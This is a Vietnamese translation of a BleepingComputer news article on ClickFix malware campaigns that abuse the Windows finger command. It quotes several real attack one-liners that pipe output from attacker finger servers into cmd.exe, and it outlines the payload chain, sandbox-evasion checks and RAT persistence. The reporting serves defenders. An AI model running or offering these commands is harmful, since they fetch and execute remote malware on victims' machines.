# Giao thức ‘Finger’ tồn tại hàng thập kỷ bị lạm dụng trong các cuộc tấn công phần mềm độc hại ClickFix

![Tin tặc chỉ tay](https://www.bleepstatic.com/content/hl-images/2025/11/15/hacker-pointing-a-finger.jpg)

Lệnh lâu đời "finger" đang quay trở lại, với các tác nhân đe dọa sử dụng giao thức để truy xuất các lệnh từ xa và thực thi trên các thiết bị Windows.

Trước đây, người ta sử dụng [lệnh finger](http://linux.die.net/man/1/finger) để tra cứu thông tin về người dùng cục bộ và từ xa trên hệ thống Unix và Linux thông qua giao thức Finger — một lệnh sau này được thêm vào Windows. Mặc dù vẫn được hỗ trợ, nó hiện hiếm khi được sử dụng so với thời hoàng kim vài thập kỷ trước.

Khi được thực thi, lệnh finger trả về thông tin cơ bản về người dùng, bao gồm tên đăng nhập, tên (nếu được đặt trong /etc/passwd), thư mục home, số điện thoại, lần xuất hiện cuối cùng và các chi tiết khác.

[![Wiz](https://www.bleepstatic.com/c/w/wiz/AI-Data-Security-970x250.png)](https://www.wiz.io/lp/ai-data-security-best-practices-cheat-sheet?utm%5Fsource=bleepingcomputer&utm%5Fmedium=display&utm%5Fcampaign=FY26Q3%5FINB%5FForm%5FAI-Data-Security-Best-Practices&sfcid=701Py00000SmgsrIAB&utm%5Fterm=FY26Q4-bleepingcomputer-970x250&utm%5Fcontent=AI-Data-Security-BP) 

![Kết quả lệnh Finger](https://www.bleepstatic.com/images/news/security/f/finger/finger-demo.jpg)

**Kết quả lệnh Finger**  
_Nguồn: BleepingComputer_

Gần đây, có các chiến dịch độc hại sử dụng giao thức Finger trong những gì có vẻ là các cuộc tấn công ClickFix nhằm truy xuất các lệnh để thực thi trên thiết bị.

Đây không phải là lần đầu tiên lệnh finger bị lạm dụng theo cách này — [các nhà nghiên cứu đã cảnh báo vào năm 2020](https://www.bleepingcomputer.com/news/security/windows-10-finger-command-can-be-abused-to-download-or-steal-files/) rằng nó từng được dùng như một LOLBIN để tải malware và né tránh phát hiện.

## Lạm dụng lệnh finger

Tháng trước, nhà nghiên cứu an ninh mạng [MalwareHunterTeam](https://x.com/malwrhunterteam) chia sẻ một tệp batch \[[VirusTotal](https://www.virustotal.com/gui/file/713d4846f83ef09befbb07f27e2f374b766b8aca4a5a1e937ba39b4dbe3c022d/behavior)\] với BleepingComputer mà khi thực thi sẽ dùng lệnh "`finger root@finger.nateams[.]com`" để truy xuất các lệnh từ một máy chủ finger từ xa, rồi chạy chúng cục bộ bằng cách chuyển output qua cmd.exe.

**Tệp batch chạy lệnh finger để truy xuất một script**  
_Nguồn: BleepingComputer_

Mặc dù host đó không còn truy cập được, MalwareHunterTeam tìm thấy thêm các mẫu malware và các cuộc tấn công khác sử dụng lệnh finger.

Ví dụ, một người trên Reddit gần đây cảnh báo rằng họ đã là nạn nhân của một cuộc tấn công ClickFix giả mạo Captcha, dụ họ chạy một lệnh Windows để xác minh họ là con người.

"I just fell for verify you are human win + r. What do I do?," viết trong bài [Reddit](http://www.reddit.com/r/MalwareAnalysis/comments/1osuo87/i%5Fjust%5Ffell%5Ffor%5Fverify%5Fyou%5Fare%5Fhuman%5Fwin%5Fr%5Fwhat/).

"Tôi vội và đã sập bẫy, cuối cùng nhập vào cmd prompt của mình như sau:"

"cmd /c start "" /min cmd /c "finger vke@finger.cloudmega\[.\]org | cmd" && echo' Verify you are human--press ENTER'"

Mặc dù host hiện không còn phản hồi yêu cầu finger, một người dùng Reddit khác đã chụp lại [kết quả đầu ra](https://www.reddit.com/r/MalwareAnalysis/comments/1osuo87/comment/no02xul/).

Cuộc tấn công này lợi dụng giao thức Finger như một phương thức phân phối script từ xa, bằng cách chạy `finger vke@finger.cloudmega[.]org` và chuyển output đó qua trình xử lý lệnh Windows, cmd.exe.

Điều này khiến các lệnh nhận được được thực thi, tạo một đường dẫn có tên ngẫu nhiên, sao chép curl.exe sang một tên file ngẫu nhiên khác, sử dụng bản curl được đổi tên đó để tải một tệp zip giả dạng PDF \[[VirusTotal](https://www.virustotal.com/gui/file/032922e952f5f67582ad5a894920794f89b459c477499bd56e57c60f5559f6b4/detection)\] từ cloudmega\[.\]org, và giải nén một gói Python độc hại.

**Nội dung lưu trữ giả dạng PDF**  
_Nguồn: BleepingComputer_

Chương trình Python sau đó được chạy bằng `pythonw.exe __init__.py`.

Lệnh cuối cùng được thực thi là một cuộc gọi lại tới máy chủ của kẻ tấn công để xác nhận việc thực thi, trong khi hiển thị một lời nhắc giả "Verify you are human" cho người dùng.

Mục đích của gói Python chưa rõ, nhưng một [tệp batch liên quan](https://x.com/malwrhunterteam/status/1987867312871936199) cho thấy nó là một infostealer.

MalwareHunterTeam cũng phát hiện một chiến dịch tương tự sử dụng "`finger Kove2@api.metrics-strange.com | cmd`" để truy xuất và chạy các lệnh gần như giống hệt với cuộc tấn công ClickFix đã đề cập.

**Kết quả lệnh finger**  
_Nguồn: BleepingComputer_

BleepingComputer nhận thấy đây là một cuộc tấn công tiến hóa hơn, với các lệnh tìm kiếm các công cụ thường dùng trong nghiên cứu malware và thoát nếu phát hiện thấy. Những công cụ này bao gồm filemon, regmon, procexp, procexp64, tcpview, tcpview64, Procmon, Procmon64, vmmap, vmmap64, portmon, processlasso, Wireshark, Fiddler, Everywhere, Fiddler, ida, ida64, ImmunityDebugger, WinDump, x64dbg, x32dbg, OllyDbg, và ProcessHacker.

Nếu không phát hiện công cụ phân tích malware, các lệnh sẽ tải xuống một tệp zip giả dạng PDF và giải nén nó. Tuy nhiên, thay vì giải nén một gói Python độc hại từ PDF giả đó, nó giải nén gói NetSupport Manager RAT.

**NetSupport Manager RAT**  
_Nguồn: BleepingComputer_

Các lệnh sau đó sẽ cấu hình một tác vụ theo lịch để khởi chạy phần mềm truy cập từ xa khi người dùng đăng nhập.

Trong khi việc lạm dụng 'finger' hiện tại dường như được tiến hành bởi một tác nhân đe dọa duy nhất thực hiện các cuộc tấn công ClickFix, vì nhiều người vẫn sập bẫy, điều quan trọng là phải nhận biết các chiến dịch này.

Đối với người phòng thủ, cách tốt nhất để chặn việc sử dụng lệnh finger là chặn lưu lượng đi ra tới TCP port 79, vì đó là cổng được dùng để kết nối tới daemon qua giao thức Finger.